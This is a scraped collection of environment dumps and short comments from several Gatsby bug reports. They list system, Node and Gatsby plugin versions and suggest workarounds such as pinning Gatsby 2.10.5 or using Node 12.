``` system: os: macos 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 10.16.2 - ~/.nvm/versions/node/v10.16.2/bin/node npm: 6.11.3 - ~/.nvm/versions/node/v10.16.2/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 76.0.3809.100 safari: 12.1.2 npmpackages: gatsby: 1.9.277 => 1.9.277 gatsby-image: ^1.0.55 => 1.0.55 gatsby-link: ^1.6.34 => 1.6.46 gatsby-plugin-netlify: ^2.1.13 => 2.1.13 gatsby-plugin-react-helmet: ^2.0.3 => 2.0.11 gatsby-plugin-remove-trailing-slashes: ^1.0.9 => 1.0.9 gatsby-plugin-robots-txt: ^1.0.2 => 1.4.0 gatsby-plugin-sass: 1.0.19 => 1.0.19 gatsby-plugin-sharp: ^1.6.48 => 1.6.48 gatsby-plugin-sitemap: ^1.2.25 => 1.2.25 gatsby-source-contentful: ^1.3.31 => 1.3.54 gatsby-source-filesystem: ^1.5.39 => 1.5.39 gatsby-transformer-remark: ^1.7.40 => 1.7.44 gatsby-transformer-sharp: ^1.6.27 => 1.6.27 npmglobalpackages: gatsby-cli: 2.7.39
# gatsby info --clipboard system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.13.0 - ~/.yarn/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.13 - /usr/local/bin/python browsers: chrome: 76.0.3809.132 firefox: 68.0.1 safari: 12.1.2 npmpackages: gatsby: ^2.13.11 => 2.15.14 gatsby-plugin-create-client-paths: ^2.1.3 => 2.1.7 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-google-analytics: ^2.0.6 => 2.1.16 gatsby-plugin-mailchimp: ^5.1.0 => 5.1.2 gatsby-plugin-manifest: ^2.0.4 => 2.2.16 gatsby-plugin-material-ui: ^2.0.1 => 2.1.6 gatsby-plugin-nprogress: ^2.1.0 => 2.1.6 gatsby-plugin-offline: ^2.0.5 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.0 => 3.1.7 gatsby-plugin-robots-txt: ^1.3.0 => 1.5.0 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-s3: 0.3.1 => 0.3.1 gatsby-plugin-sitemap: ^2.0.1 => 2.2.12 gatsby-plugin-webpack-size: 1.0.0 => 1.0.0 gatsby-source-prismic: 2.3.0-alpha.6 => 2.3.0-alpha.6 ``` ---- thank you for spending the time to look into this!
``` system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz binaries: yarn: 1.17.3 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.3 browsers: edge: 44.18362.329.0 npmpackages: gatsby: ^2.15.15 => 2.15.15 gatsby-theme-notes: ^1.0.3 => 1.0.3 ```
``` system: os: linux 4.4 ubuntu 18.04.2 lts (bionic beaver) cpu: (16) x64 amd ryzen 7 3700x 8-core processor shell: 5.4.2 - /usr/bin/zsh binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.16.0 - ~/.yarn/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm npmpackages: gatsby: ^2.15.15 => 2.15.15 gatsby-image: ^2.2.19 => 2.2.19 gatsby-plugin-manifest: ^2.2.16 => 2.2.16 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.7 => 3.1.7 gatsby-plugin-sharp: ^2.2.22 => 2.2.22 gatsby-source-filesystem: ^2.1.22 => 2.1.22 gatsby-transformer-sharp: ^2.2.14 => 2.2.14
system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-3230m cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - ~/n/bin/node npm: 6.10.3 - ~/n/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 76.0.3809.132 safari: 12.1.2 npmpackages: gatsby: ^2.15.14 => 2.15.14 gatsby-image: ^2.2.18 => 2.2.18 gatsby-plugin-manifest: ^2.2.16 => 2.2.16 gatsby-plugin-react-helmet: ^3.1.7 => 3.1.7 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.2.21 => 2.2.21 gatsby-source-filesystem: ^2.1.22 => 2.1.22 gatsby-transformer-sharp: ^2.2.14 => 2.2.14 npmglobalpackages: gatsby-cli: 2.7.47
system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-4288u cpu @ 2.60ghz shell: 3.0.2 - /usr/local/bin/fish binaries: node: 8.16.0 - /usr/local/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.10.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 76.0.3809.132 firefox: 68.0.2 safari: 12.1.2 npmpackages: gatsby: ^2.13.68 => 2.15.5
``` system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.7.1 - /usr/local/bin/zsh binaries: node: 12.9.1 - ~/.nvm/versions/node/v12.9.1/bin/node yarn: 1.17.3 - ~/projects/99designs/99awards/99awards/node_modules/.bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v12.9.1/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 76.0.3809.132 firefox: 68.0.2 safari: 12.1.2 npmpackages: gatsby: ^2.13.32 => 2.15.2 gatsby-link: ^2.2.1 => 2.2.11 gatsby-plugin-layout: ^1.1.1 => 1.1.6 gatsby-plugin-react-helmet: ^3.1.1 => 3.1.6 gatsby-plugin-sass: ^2.1.1 => 2.1.13 gatsby-plugin-sharp: ^2.2.18 => 2.2.19 gatsby-plugin-typescript: ^2.1.1 => 2.1.6 gatsby-source-contentful: ^2.1.29 => 2.1.30 gatsby-source-filesystem: ^2.1.4 => 2.1.19 gatsby-transformer-remark: ^2.6.19 => 2.6.20 gatsby-transformer-sharp: ^2.2.12 => 2.2.13 gatsby-transformer-yaml: ^2.2.1 => 2.2.8
``` ### references
related: - [fix(gatsby): use anonymous requests when fetching resources](
- #diff-e5ad541d7ba3f6bf26b5132b218f2a84
- #diff-917ba78a52f29b1a1fe42be34d81fc83
system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-3470s cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.3 - /usr/local/bin/node npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 76.0.3809.132 firefox: 68.0.2 safari: 12.1.2 npmpackages: gatsby: ^2.15.14 => 2.15.14 gatsby-cli: ^2.7.47 => 2.7.47 gatsby-image: ^2.2.18 => 2.2.18 gatsby-plugin-feed: ^2.3.12 => 2.3.12 gatsby-plugin-manifest: ^2.2.16 => 2.2.16 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.7 => 3.1.7 gatsby-plugin-remote-images: ^1.0.7 => 1.0.7 gatsby-plugin-sass: ^2.1.14 => 2.1.14 gatsby-plugin-sharp: ^2.2.21 => 2.2.21 gatsby-plugin-stripe: ^1.2.2 => 1.2.2 gatsby-source-apiserver: ^2.1.3 => 2.1.3 gatsby-source-filesystem: ^2.1.22 => 2.1.22 gatsby-source-thirdparty: ^1.0.5 => 1.0.6 gatsby-transformer-remark: ^2.6.22 => 2.6.22 gatsby-transformer-sharp: ^2.2.14 => 2.2.14 npmglobalpackages: gatsby-cli: 2.5.15 gatsby-project-website: 1.0.0
``` system: os: macos 10.14.6 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/sh binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v8.11.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 76.0.3809.132 firefox: 68.0.2 safari: 12.1.2 npmpackages: gatsby: ^2.15.14 => 2.15.14 gatsby-cli: ^2.7.7 => 2.7.7 gatsby-image: ^2.0.20 => 2.0.29 gatsby-link: ^2.0.14 => 2.0.14 gatsby-plugin-catch-links: ^2.0.12 => 2.0.12 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-google-tagmanager: ^2.1.2 => 2.1.2 gatsby-plugin-manifest: ^2.2.5 => 2.2.5 gatsby-plugin-netlify-cms: ^4.1.14 => 4.1.14 gatsby-plugin-node-fields: ^2.0.1 => 2.0.1 gatsby-plugin-page-creator: ^2.0.4 => 2.0.7 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.6 gatsby-plugin-react-helmet-canonical-urls: ^1.2.0 => 1.2.0 gatsby-plugin-sharp: ^2.2.11 => 2.2.11 gatsby-plugin-sitemap: ^2.0.5 => 2.0.5 gatsby-plugin-styled-components: ^3.0.4 => 3.0.6 gatsby-plugin-svgr: ^2.0.2 => 2.0.2 gatsby-react-router-scroll: ^2.0.1 => 2.0.4 gatsby-remark-autolink-headers: ^2.1.1 => 2.1.1 gatsby-remark-component-parent2div: ^1.2.3 => 1.2.3 gatsby-remark-copy-linked-files: ^2.0.12 => 2.0.12 gatsby-remark-embed-video: ^1.4.0 => 1.7.0 gatsby-remark-images: ^3.0.1 => 3.0.4 gatsby-remark-relative-images: ^0.2.1 => 0.2.1 gatsby-remark-responsive-iframe: ^2.1.1 => 2.1.1 gatsby-remark-smartypants: ^2.0.9 => 2.0.9 gatsby-remark-unwrap-images: ^1.0.1 => 1.0.1 gatsby-source-filesystem: ^2.0.8 => 2.0.21 gatsby-transformer-json: ^2.1.5 => 2.1.8 gatsby-transformer-remark: ^2.3.12 => 2.3.12 gatsby-transformer-sharp: ^2.2.5 => 2.2.5 npmglobalpackages: gatsby-cli: 2.4.15
system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 12.8.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm browsers: chrome: 76.0.3809.132 firefox: 68.0.2 safari: 12.1.2 npmpackages: gatsby: ^2.15.14 => 2.15.14 gatsby-image: ^2.2.18 => 2.2.18 gatsby-plugin-manifest: ^2.2.16 => 2.2.16 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.7 => 3.1.7 gatsby-plugin-sharp: ^2.2.21 => 2.2.21 gatsby-source-filesystem: ^2.1.22 => 2.1.22 gatsby-transformer-sharp: ^2.2.14 => 2.2.14
github repo:
``` system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 12.7.0 - ~/.nvm/versions/node/v12.7.0/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.10.0 - ~/.nvm/versions/node/v12.7.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 76.0.3809.132 firefox: 68.0.1 safari: 12.1.2 npmpackages: gatsby: ^2.15.12 => 2.15.12 gatsby-image: ^2.2.18 => 2.2.18 gatsby-plugin-crisp-chat: ^2.2.0 => 2.2.0 gatsby-plugin-google-tagmanager: ^2.1.9 => 2.1.9 gatsby-plugin-manifest: ^2.2.16 => 2.2.16 gatsby-plugin-netlify: ^2.1.12 => 2.1.12 gatsby-plugin-netlify-cms: ^4.1.14 => 4.1.14 gatsby-plugin-nprogress: ^2.1.6 => 2.1.6 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-purgecss: ^2.4.0 => 2.4.0 gatsby-plugin-react-helmet: ^3.1.7 => 3.1.7 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-sass: ^2.1.14 => 2.1.14 gatsby-plugin-sharp: ^2.2.21 => 2.2.21 gatsby-plugin-sitemap: ^2.2.12 => 2.2.12 gatsby-plugin-styled-components: ^3.1.5 => 3.1.5 gatsby-remark-copy-linked-files: ^2.1.18 => 2.1.18 gatsby-remark-images: ^3.1.21 => 3.1.21 gatsby-remark-relative-images: ^0.2.2 => 0.2.3 gatsby-remark-responsive-iframe: ^2.2.15 => 2.2.15 gatsby-source-filesystem: ^2.1.22 => 2.1.22 gatsby-transformer-remark: ^2.6.22 => 2.6.22 gatsby-transformer-sharp: ^2.2.14 => 2.2.14 npmglobalpackages: gatsby-cli: 2.6.4
``` system: os: macos 10.14.5 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 76.0.3809.132 firefox: 68.0.1 safari: 12.1.1 npmglobalpackages: gatsby-cli: 2.7.44 ``` for now i'm just using gatsby@2.8.8 but this seems like an important one! i noticed this affecting a couple of my projects already as well as a barebones test repo i made with `gatsby-source-wordpress`.
system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.0 - ~/.nvm/versions/node/v8.11.0/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v8.11.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 76.0.3809.132 firefox: 66.0.5 safari: 12.1.2 npmpackages: gatsby: ^2.13.45 => 2.15.3 gatsby-plugin-catch-links: ^2.1.2 => 2.1.7 gatsby-plugin-compile-es6-packages: ^1.1.0 => 1.2.0 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-google-tagmanager: ^2.1.8 => 2.1.8 gatsby-plugin-manifest: 2.2.6 => 2.2.6 **(it works here, just not on 2.2.7+)** gatsby-plugin-polyfill-io: ^1.1.0 => 1.1.0 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.6 gatsby-plugin-sitemap: ^2.2.4 => 2.2.10 gatsby-plugin-styled-components: ^3.1.4 => 3.1.2
gatsby on ubuntu linux subsystem
google chrome version 76.0.3809.132 (official build) (64-bit)
``` system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 5.3 - /bin/zsh binaries: node: 12.9.1 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.10.3 - /usr/local/bin/npm languages: python: 3.7.4 - /usr/local/opt/python/libexec/bin/python browsers: chrome: 76.0.3809.132 firefox: 68.0 safari: 12.1.2 npmpackages: gatsby: ^2.13.73 => 2.13.73 gatsby-plugin-manifest: ^2.2.6 => 2.2.6 npmglobalpackages: gatsby-cli: 2.7.33
``` system: os: macos 10.14.6 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node yarn: 1.16.0 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 76.0.3809.100 firefox: 68.0 safari: 12.1.2 npmglobalpackages: gatsby-cli: 2.7.38
> gatsby info --clipboard system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 3.0.2 - /usr/local/bin/fish binaries: node: 12.9.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.10.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 76.0.3809.132 firefox: 66.0 safari: 12.1.2 npmpackages: gatsby: ^2.1.0 => 2.14.2 gatsby-cli: ^2.4.9 => 2.7.19 gatsby-image: ^2.0.29 => 2.2.14 gatsby-plugin-catch-links: ^2.0.10 => 2.1.5 gatsby-plugin-emotion: ^4.0.3 => 4.1.4 gatsby-plugin-feed: ^2.0.13 => 2.3.9 gatsby-plugin-google-analytics: ^2.0.13 => 2.1.12 gatsby-plugin-lunr: ^1.4.0 => 1.5.2 gatsby-plugin-offline: ^2.0.23 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.6 => 3.1.5 gatsby-plugin-robots-txt: ^1.4.0 => 1.5.0 gatsby-plugin-sharp: ^2.2.18 => 2.2.18 gatsby-plugin-sitemap: ^2.0.5 => 2.2.9 gatsby-plugin-typescript: ^2.1.2 => 2.1.5 gatsby-plugin-typography: ^2.2.7 => 2.3.5 gatsby-remark-autolink-headers: ^2.0.14 => 2.1.8 gatsby-remark-images: ^3.0.3 => 3.1.19 gatsby-remark-prismjs: ^3.2.4 => 3.3.9 gatsby-source-filesystem: ^2.0.20 => 2.1.18 gatsby-transformer-remark: ^2.2.4 => 2.6.19 gatsby-transformer-sharp: ^2.2.12 => 2.2.12 ```
system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 5.3 - /bin/zsh binaries: node: 11.9.0 - /usr/local/bin/node npm: 6.11.0 - /usr/local/bin/npm languages: python: 3.7.4 - /usr/local/opt/python/libexec/bin/python browsers: chrome: 76.0.3809.100 firefox: 68.0 safari: 12.1.2 npmpackages: gatsby: 2.13.80 => 2.13.80 gatsby-image: 2.2.13 => 2.2.13 gatsby-plugin-sharp: 2.2.17 => 2.2.17 gatsby-remark-images: 3.1.17 => 3.1.17 gatsby-source-filesystem: 2.1.16 => 2.1.16 gatsby-transformer-remark: 2.6.19 => 2.6.19 gatsby-transformer-sharp: 2.2.11 => 2.2.11 npmglobalpackages: gatsby-cli: 2.7.33
the environment in circleci: ``` system: os: linux 4.15 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (36) x64 intel(r) xeon(r) platinum 8124m cpu @ 3.00ghz shell: 4.4.12 - /bin/bash binaries: node: 10.16.3 - /tmp/yarn--1567168012210-0.10582705648443946/node yarn: 1.17.3 - /tmp/yarn--1567168012210-0.10582705648443946/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python npmpackages: gatsby: ^2.15.0 => 2.15.0 gatsby-image: ^2.2.15 => 2.2.15 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-manifest: ^2.2.11 => 2.2.11 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.5 => 3.1.5 gatsby-plugin-sharp: ^2.2.18 => 2.2.18 gatsby-plugin-styled-components: ^3.1.3 => 3.1.3 gatsby-plugin-typescript: ^2.1.5 => 2.1.5 gatsby-source-filesystem: ^2.1.18 => 2.1.18 gatsby-source-graphql: ^2.1.11 => 2.1.11 gatsby-transformer-sharp: ^2.2.12 => 2.2.12 ```
> 30 aug update: updated all gatsby packages, the problem persists
"gatsby": "^2.13.67"
"gatsby-plugin-sass": "^2.1.8"
"gatsby-plugin-postcss": "^2.1.3"
``` ``` system: os: linux 5.0 ubuntu 18.04.3 lts (bionic beaver) cpu: (12) x64 amd ryzen 5 2600x six-core processor shell: 4.4.20 - /bin/bash binaries: node: 11.14.0 - /tmp/yarn--1566058060211-0.37519524786455727/node yarn: 1.17.3 - /tmp/yarn--1566058060211-0.37519524786455727/yarn npm: 6.7.0 - ~/n/bin/npm languages: python: 3.7.2 - /home/starptech/.pyenv/shims/python browsers: chrome: 76.0.3809.100
system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz binaries: yarn: 1.17.3 npm: 6.10.3 languages: python: 3.7.1 browsers: edge: 44.18362.267.0 npmpackages: gatsby: ^2.13.67 => 2.13.67 gatsby-image: ^2.2.8 => 2.2.8 gatsby-plugin-feed: ^2.3.6 => 2.3.6 gatsby-plugin-google-analytics: ^2.1.7 => 2.1.7 gatsby-plugin-manifest: ^2.2.5 => 2.2.5 gatsby-plugin-offline: ^2.2.6 => 2.2.6 gatsby-plugin-react-helmet: ^3.1.3 => 3.1.3 gatsby-plugin-sharp: ^2.2.12 => 2.2.12 gatsby-plugin-typography: ^2.3.2 => 2.3.2 gatsby-remark-copy-linked-files: ^2.1.6 => 2.1.6 gatsby-remark-images: ^3.1.12 => 3.1.12 gatsby-remark-prismjs: ^3.3.5 => 3.3.5 gatsby-remark-responsive-iframe: ^2.2.4 => 2.2.4 gatsby-remark-smartypants: ^2.1.2 => 2.1.2 gatsby-source-filesystem: ^2.1.9 => 2.1.9 gatsby-transformer-remark: ^2.6.14 => 2.6.14 gatsby-transformer-sharp: ^2.2.6 => 2.2.6 ### more info it looks like the `gatsby-remark-images` generate caption from markdown `gethtml` function from `gatsby-transform-remark`
i guess the "markdownnode" of the image caption does not have `node.internal.contentdigest`
system: os: linux 5.0 ubuntu 19.04 (disco dingo) cpu: (4) x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz shell: 5.0.3 - /bin/bash binaries: node: 10.16.2 - /usr/bin/node npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: firefox: 68.0.1 npmpackages: gatsby: ^2.12.0 => 2.13.61 gatsby-image: ^2.2.6 => 2.2.8 gatsby-plugin-google-analytics: ^2.1.6 => 2.1.7 gatsby-plugin-manifest: ^2.2.3 => 2.2.5 gatsby-plugin-netlify: ^2.1.3 => 2.1.4 gatsby-plugin-offline: ^2.2.4 => 2.2.5 gatsby-plugin-page-creator: ^2.1.5 => 2.1.5 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.3 gatsby-plugin-sass: ^2.1.3 => 2.1.8 gatsby-plugin-sharp: ^2.2.7 => 2.2.11 gatsby-plugin-transition-link: ^1.12.4 => 1.12.4 gatsby-remark-copy-linked-files: ^2.1.3 => 2.1.5 gatsby-remark-images: ^3.1.6 => 3.1.10 gatsby-remark-prismjs: ^3.3.3 => 3.3.5 gatsby-source-filesystem: ^2.1.5 => 2.1.9 gatsby-transformer-json: ^2.2.2 => 2.2.2 gatsby-transformer-remark: ^2.6.6 => 2.6.13 gatsby-transformer-sharp: ^2.2.3 => 2.2.6 *note that i am getting the same result on netlify
haven't tested on mac or windows, though
it might work properly on either one or both.*
system: os: linux 3.13 ubuntu 14.04.6 lts, trusty tahr cpu: (12) x64 intel(r) core(tm) i7-5820k cpu @ 3.30ghz shell: 4.3.11 - /bin/bash binaries: node: 12.6.0 - /home/linuxbrew/.linuxbrew/bin/node npm: 6.9.0 - /home/linuxbrew/.linuxbrew/bin/npm languages: python: 2.7.6 - /usr/bin/python browsers: chrome: 76.0.3809.100 firefox: 66.0.3 npmpackages: gatsby: ^2.13.42 => 2.13.42 gatsby-cli: ^2.7.21 => 2.7.21 gatsby-image: ^2.2.7 => 2.2.7 gatsby-plugin-manifest: ^2.2.4 => 2.2.4 gatsby-plugin-mdx: ^1.0.18 => 1.0.18 gatsby-plugin-offline: ^2.2.4 => 2.2.4 gatsby-plugin-optimize-svgs: ^1.0.3 => 1.0.3 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.2 gatsby-plugin-sharp: ^2.2.9 => 2.2.9 gatsby-plugin-styled-components: ^3.1.2 => 3.1.2 gatsby-plugin-typography: ^2.3.2 => 2.3.2 gatsby-remark-images: ^3.1.10 => 3.1.10 gatsby-source-filesystem: ^2.1.6 => 2.1.6 gatsby-transformer-sharp: ^2.2.5 => 2.2.5
system: os: windows 10 cpu: (4) x64 intel(r) core(tm) i7-7660u cpu @ 2.50ghz binaries: yarn: 1.15.2 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: 2.13.62 => 2.13.62 gatsby-image: 2.2.8 => 2.2.8 gatsby-plugin-google-analytics: 2.1.7 => 2.1.7 gatsby-plugin-postcss: 2.1.3 => 2.1.3 gatsby-plugin-purgecss: 4.0.0 => 4.0.0 gatsby-plugin-react-helmet: 3.1.3 => 3.1.3 gatsby-plugin-react-svg: 2.1.2 => 2.1.2 gatsby-plugin-typescript: 2.1.2 => 2.1.2 gatsby-source-contentful: 2.1.19 => 2.1.19
system: os: linux 4.15 ubuntu 18.04.3 lts (bionic beaver) cpu: x64 intel(r) xeon(r) cpu e3-1280 v3 @ 3.60ghz shell: 5.4.2 - /bin/zsh binaries: node: 10.16.2 - /usr/bin/node yarn: 1.17.3 - /usr/bin/yarn npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.15+ - /usr/bin/python browsers: firefox: 68.0.1 npmpackages: gatsby: ^2.13.61 => 2.13.61 gatsby-image: ^2.2.8 => 2.2.8 gatsby-plugin-manifest: ^2.2.5 => 2.2.5 gatsby-plugin-offline: ^2.2.5 => 2.2.5 gatsby-plugin-react-helmet: ^3.1.3 => 3.1.3 gatsby-plugin-sharp: ^2.2.11 => 2.2.11 gatsby-source-filesystem: ^2.1.9 => 2.1.9 gatsby-theme-blog: ^1.0.2 => 1.0.2 gatsby-transformer-sharp: ^2.2.6 => 2.2.6 ### more info it looks like one of the remark plugins of the theme - `gatsby-remark-numbered-footnotes` - is causing the issue
removing it from the gatsby-config of the theme made it work (obviously without the functionality of the plugin)
amazon lightsail.
``` system: os: linux 4.4 ubuntu 16.04.6 lts (xenial xerus) cpu: (1) x64 intel(r) xeon(r) cpu e5-2676 v3 @ 2.40ghz shell: 4.3.48 - /bin/bash binaries: node: 10.16.2 - /usr/local/bin/node yarn: 1.17.3 - /usr/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.12 - /usr/bin/python npmpackages: gatsby: ^2.13.45 => 2.13.45 gatsby-image: ^2.2.7 => 2.2.7 gatsby-plugin-eslint: ^2.0.5 => 2.0.5 gatsby-plugin-google-analytics: ^2.1.7 => 2.1.7 gatsby-plugin-manifest: ^2.2.4 => 2.2.4 gatsby-plugin-offline: ^2.2.5 => 2.2.5 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.2 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: ^2.2.9 => 2.2.9 gatsby-plugin-styled-components: ^3.1.2 => 3.1.2 gatsby-source-filesystem: ^2.1.7 => 2.1.7 gatsby-source-graphql: ^2.1.4 => 2.1.4 gatsby-source-wordpress: ^3.1.13 => 3.1.13 gatsby-transformer-sharp: ^2.2.5 => 2.2.5 npmglobalpackages: gatsby-cli: 2.7.29
``` is there anything i can to do to get this to work?
``` system: os: macos 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.8.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.10.3 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 76.0.3809.100 safari: 12.1.2 npmpackages: gatsby: ^2.13.57 => 2.13.57 gatsby-image: ^2.2.8 => 2.2.8 gatsby-plugin-catch-links: ^2.1.2 => 2.1.2 gatsby-plugin-google-analytics: ^2.1.7 => 2.1.7 gatsby-plugin-layout: ^1.1.3 => 1.1.3 gatsby-plugin-manifest: ^2.2.5 => 2.2.5 gatsby-plugin-offline: ^2.2.5 => 2.2.5 gatsby-plugin-react-helmet: ^3.1.3 => 3.1.3 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-sass: ^2.1.6 => 2.1.6 gatsby-plugin-sharp: ^2.2.11 => 2.2.11 gatsby-plugin-sitemap: ^2.2.6 => 2.2.6 gatsby-plugin-typescript: ^2.1.2 => 2.1.2 gatsby-remark-embed-video: ^1.7.1 => 1.7.1 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^3.1.8 => 3.1.8 gatsby-remark-responsive-iframe: ^2.2.4 => 2.2.4 gatsby-source-filesystem: ^2.1.9 => 2.1.9 gatsby-transformer-json: ^2.2.2 => 2.2.2 gatsby-transformer-remark: ^2.6.12 => 2.6.12 gatsby-transformer-sharp: ^2.2.6 => 2.2.6 npmglobalpackages: gatsby-cli: 2.7.29
as mentioned previously, this only seems to present itself when using `npm` (not `yarn`) and node.js version prior to v12
reproduced in multiple environments (ci and local), but current local is:
``` system: os: windows 10 cpu: (16) x64 intel(r) core(tm) i9-9900k cpu @ 3.60ghz binaries: yarn: 1.17.3 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.1.0 npmpackages: gatsby: ^2.13.54 => 2.13.56 gatsby-image: ^2.2.8 => 2.2.8 gatsby-plugin-manifest: ^2.2.5 => 2.2.5 gatsby-plugin-offline: ^2.2.5 => 2.2.5 gatsby-plugin-react-helmet: ^3.1.3 => 3.1.3 gatsby-plugin-sharp: ^2.2.10 => 2.2.10 gatsby-plugin-use-dark-mode: 1.1.2 => 1.1.2 gatsby-source-filesystem: ^2.1.9 => 2.1.9 gatsby-transformer-sharp: ^2.2.6 => 2.2.6 ``` ### workarounds 1
downgrade and pin `gatsby` to `2.10.5`
use `yarn` (maybe?)
use node.js v12
